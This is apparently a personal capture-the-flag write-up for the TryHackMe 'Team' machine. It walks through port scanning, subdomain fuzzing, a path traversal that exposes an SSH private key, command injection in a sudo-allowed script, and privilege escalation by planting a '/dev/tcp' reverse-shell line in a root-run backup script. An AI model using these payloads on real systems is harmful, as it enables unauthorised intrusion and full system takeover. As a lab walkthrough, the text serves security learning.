---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Team
# DESCRIPTION       . Beginner friendly boot2root machine
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/teamcw
```

```
pi@raspberry:~ $ sudo nmap -sSVC -T5 -p- 10.10.83.82 -oN team
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 795f116a85c20824306cd488741b794d (RSA)
|   256 af7e3f7eb4865883f1f6a254a69bbaad (ECDSA)
|_  256 2625b07bdc3fb29437125dcd0698c79f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

#### PORT 80

- Checking the source code, we find the following

```
If you see this add 'team.thm' to your hosts!
```

- So we added `ip             team.thm` to our `/etc/hosts` file.

- Fuzzing `team.thm`, we find several pieces of relevant information

```
assets                  [Status: 301, Size: 305, Words: 20, Lines: 10]
images                  [Status: 301, Size: 305, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 2966, Words: 140, Lines: 90]
robots.txt              [Status: 200, Size: 5, Words: 1, Lines: 2]
scripts                 [Status: 301, Size: 306, Words: 20, Lines: 10]
```

**robots.txt** 

- contains the string `dale` - possible username.

**scripts** and **assets** - no access.

**images** - just images.

- Having to clear path found, I tried to bruteforce both `SSH` and `FTP` with `dale` as username, but I since I haven't had any luck in the first few minutes, I assumed this isn't the right path.

- So I've decided to fuzz for subdomains

```
fuf -c -w /usr/share/wordlists/wfuzz/general/common.txt -u http://team.thm -H "Host: FUZZ.team.thm" -fl 374
```

**NOTE**: I added `-fl 374` because I got a lot of `200 OK` having 374 lines in length and I assumed those are false positives.

```
dev                     [Status: 200, Size: 187, Words: 20, Lines: 10]
www                     [Status: 200, Size: 2966, Words: 140, Lines: 90]
```

- Modify `/etc/hosts` to point to `dev.team.thm`

- After clicking the link, the URL changes to `http://dev.team.thm/script.php?page=teamshare.php`.

- Trying to replace `teamshare.php` with a simple `../../../etc/passwd` reveals that the page is vulnerable to Path Traversal.

- I tried looking for `/home/dale/.ssh/id_rsa` but I had no luck ; next, I've decided to check the config of ssh to see if the user `dale` is even allowed to `SSH` into the box, and I kind of hit the jackpot :)

- After reading the `/etc/ssh/sshd_config` file I found the `private key` of `dale` at the end. (and yes, he's allowed to SSH to the box)

```
{TRUNCATED}

AllowUsers dale gyles

#Dale id_rsa

#-----BEGIN OPENSSH PRIVATE KEY-----
#b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
#NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE
#NUkbi5WUOdR4ock4dFjk03X1bDshaisAFRJJkgUq1+zNJ+p96ZIEKtm93aYy3+YggliN/W
#oG+RPqP8P6/uflU0ftxkHE54H1Ll03HbN+0H4JM/InXvuz4U9Df09m99JYi6DVw5XGsaWK
#o9WqHhL5XS8lYu/fy5VAYOfJ0pyTh8IdhFUuAzfuC+fj0BcQ6ePFhxEF6WaNCSpK2v+qxP
#zMUILQdztr8WhURTxuaOQOIxQ2xJ+zWDKMiynzJ/lzwmI4EiOKj1/nh/w7I8rk6jBjaqAu
#k5xumOxPnyWAGiM0XOBSfgaU+eADcaGfwSF1a0gI8G/TtJfbcW33gnwZBVhc30uLG8JoKS
#xtA1J4yRazjEqK8hU8FUvowsGGls+trkxBYgceWwJFUudYjBq2NbX2glKz52vqFZdbAa1S
#0soiabHiuwd+3N/ygsSuDhOhKIg4MWH6VeJcSMIrAAAFkNt4pcTbeKXEAAAAB3NzaC1yc2
#EAAAGBAJ4OijEx985vuq6nkM5+RywY4K7gfZNq1/13cwq+o73RSyfrh+GVRDVJG4uVlDnU
#eKHJOHRY5NN19Ww7IWorABUSSZIFKtfszSfqfemSBCrZvd2mMt/mIIJYjf1qBvkT6j/D+v
								{REDACTED}
#wQC5Tzei2ZXPj5yN7EgrQk16vUivWP9p6S8KUxHVBvqdJDoQqr8IiPovs9EohFRA3M3h0q
#z+zdN4wIKHMdAg0yaJUUj9WqSwj9ItqNtDxkXpXkfSSgXrfaLz3yXPZTTdvpah+WP5S8u6
#RuSnARrKjgkXT6bKyfGeIVnIpHjUf5/rrnb/QqHyE+AnWGDNQY9HH36gTyMEJZGV/zeBB7
#/ocepv6U5HWlqFB+SCcuhCfkegFif8M7O39K1UUkN6PWb4/IoAAADBAMuCxRbJE9A7sxzx
#sQD/wqj5cQx+HJ82QXZBtwO9cTtxrL1g10DGDK01H+pmWDkuSTcKGOXeU8AzMoM9Jj0ODb
#mPZgp7FnSJDPbeX6an/WzWWibc5DGCmM5VTIkrWdXuuyanEw8CMHUZCMYsltfbzeexKiur
#4fu7GSqPx30NEVfArs2LEqW5Bs/bc/rbZ0UI7/ccfVvHV3qtuNv3ypX4BuQXCkMuDJoBfg
#e9VbKXg7fLF28FxaYlXn25WmXpBHPPdwAAAMEAxtKShv88h0vmaeY0xpgqMN9rjPXvDs5S
#2BRGRg22JACuTYdMFONgWo4on+ptEFPtLA3Ik0DnPqf9KGinc+j6jSYvBdHhvjZleOMMIH
#8kUREDVyzgbpzIlJ5yyawaSjayM+BpYCAuIdI9FHyWAlersYc6ZofLGjbBc3Ay1IoPuOqX
#b1wrZt/BTpIg+d+Fc5/W/k7/9abnt3OBQBf08EwDHcJhSo+4J4TFGIJdMFydxFFr7AyVY7
#CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH
#-----END OPENSSH PRIVATE KEY-----
```

- User flag is in `/home/dale/user.txt`.

```
User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

```
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"

```

- This is a bash script ; however, this is owned by user gyles, and since `$error` is getting executed, let's try running the script with the `/bin/bash` as input instead of date.

```
Reading stats.
Reading stats..
Enter name of person backing up the data: abc
Enter 'date' to timestamp the file: /bin/bash
The Date is whoami
gyles
```

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- Back to privilege escalation.

```
gyles@TEAM:~$ id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
```

- `editors` and `admin` are not default groups a user should be in, so let's see what files are owned by these groups.

```
gyles@TEAM:~$ find / -group admin 2>/dev/null
/usr/local/bin
/usr/local/bin/main_backup.sh
/opt/admin_stuff

gyles@TEAM:~$ find / -group editors 2>/dev/null
/var/stats/stats.txt
/home/gyles/admin_checks
```

- The `/opt/admin_stuff` directory contains a `script.sh` file that is owned by `root:root` and we can't execute it ;

- `/usr/loca/bin/main_backup.sh` is owned by `root:admin` and we have `rwx` permissions for it.

```
gyles@TEAM:~$ ls -l /opt/admin_stuff/
-rwxr--r-- 1 root root 200 Jan 17  2021 script.sh
```

```
gyles@TEAM:~$ ls -l /usr/local/bin/main_backup.sh 
-rwxrwxr-x 1 root admin 65 Jan 17  2021 /usr/local/bin/main_backup.sh
```

```
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
```

- I've changed the `cp` command to `sh -i 5<> /dev/tcp/10.11.53.46/3131 0<&5 1>&5 2>&5` and waited for a short while with my listener on even if I didn't see anything in `/etc/crontab`. 

- Shortly after I got a shell as `root`.

- The last flag is in `/root/root.txt`.